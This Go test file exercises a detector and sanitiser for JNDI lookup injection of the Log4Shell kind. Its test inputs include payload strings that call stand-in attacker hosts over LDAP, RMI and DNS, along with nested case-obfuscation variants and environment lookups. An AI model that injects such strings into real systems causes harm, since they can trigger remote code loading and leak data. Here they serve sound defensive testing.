package main

import "testing"

func jndReasons(fs []JNDFinding) []string {
	out := make([]string, 0, len(fs))
	for _, f := range fs {
		out = append(out, f.Reason)
	}
	return out
}

func jndHas(fs []JNDFinding, reason string) bool {
	for _, f := range fs {
		if f.Reason == reason {
			return true
		}
	}
	return false
}

func TestJNDBasicLDAP(t *testing.T) {
	pol := DefaultJNDPolicy()
	safe, fs := JNDInspect("hello ${jndi:ldap://evil.test/a} world", pol)
	if safe {
		t.Fatal("expected unsafe for ldap jndi")
	}
	if !jndHas(fs, JNDReasonDangerProtocol) {
		t.Fatalf("want danger protocol, got %v", jndReasons(fs))
	}
}

func TestJNDCaseInsensitive(t *testing.T) {
	pol := DefaultJNDPolicy()
	safe, fs := JNDInspect("${${lower:J}NDI:RMI://x/y}", pol)
	if safe {
		t.Fatal("expected unsafe for obfuscated rmi")
	}
	if !jndHas(fs, JNDReasonNestedObfuscate) {
		t.Fatalf("want nested obf, got %v", jndReasons(fs))
	}
}

func TestJNDDNSProtocol(t *testing.T) {
	pol := DefaultJNDPolicy()
	_, fs := JNDInspect("${jndi:dns://attacker.test/x}", pol)
	if !jndHas(fs, JNDReasonDangerProtocol) {
		t.Fatalf("want dns danger, got %v", jndReasons(fs))
	}
}

func TestJNDCleanText(t *testing.T) {
	pol := DefaultJNDPolicy()
	safe, fs := JNDInspect("A normal chat message with price ${5} and coins", pol)
	if !safe {
		t.Fatalf("expected safe, got %v", jndReasons(fs))
	}
}

func TestJNDInfoLookup(t *testing.T) {
	pol := DefaultJNDPolicy()
	_, fs := JNDInspect("${env:USERPROFILE}", pol)
	if !jndHas(fs, JNDReasonInfoLookup) {
		t.Fatalf("want info lookup, got %v", jndReasons(fs))
	}
}

func TestJNDInfoLookupSuppressed(t *testing.T) {
	pol := DefaultJNDPolicy()
	pol.ReportInfoLookups = false
	safe, _ := JNDInspect("${hostName}", pol)
	if !safe {
		t.Fatal("hostName should be allowed when info lookups disabled")
	}
}

func TestJNDUnclosed(t *testing.T) {
	pol := DefaultJNDPolicy()
	_, fs := JNDInspect("trailing ${jndi:ldap", pol)
	if !jndHas(fs, JNDReasonUnclosedExpr) {
		t.Fatalf("want unclosed, got %v", jndReasons(fs))
	}
}

func TestJNDWhitespaceObfuscation(t *testing.T) {
	pol := DefaultJNDPolicy()
	_, fs := JNDInspect("${jndi:${lower:l}${lower:d}ap://x}", pol)
	if !jndHas(fs, JNDReasonNestedObfuscate) {
		t.Fatalf("want nested obf, got %v", jndReasons(fs))
	}
}

func TestJNDMultipleHits(t *testing.T) {
	pol := DefaultJNDPolicy()
	_, fs := JNDInspect("${jndi:ldap://a} and ${jndi:rmi://b}", pol)
	if len(fs) < 2 {
		t.Fatalf("want at least 2 findings, got %d", len(fs))
	}
}

func TestJNDSanitize(t *testing.T) {
	got := JNDSanitize("${jndi:ldap://x}")
	if got == "${jndi:ldap://x}" {
		t.Fatal("sanitize did not break expression")
	}
	// 幂等
	if JNDSanitize(got) != got {
		t.Fatal("sanitize not idempotent")
	}
}

func TestJNDNestedSpanParse(t *testing.T) {
	spans, unclosed := jndScanExpressions("a${b${c}d}e")
	if len(spans) != 1 || !spans[0].nested || len(unclosed) != 0 {
		t.Fatalf("unexpected spans=%v unclosed=%v", spans, unclosed)
	}
	if spans[0].inner != "b${c}d" {
		t.Fatalf("bad inner %q", spans[0].inner)
	}
}

func TestJNDMaxBytesLimit(t *testing.T) {
	pol := DefaultJNDPolicy()
	pol.MaxTextBytes = 4
	// payload 完全在截断点之后
	long := "abcdefghijklmnop" + "${jndi:ldap://x}"
	safe, _ := JNDInspect(long, pol)
	if !safe {
		t.Fatal("payload beyond limit should not be seen")
	}
}
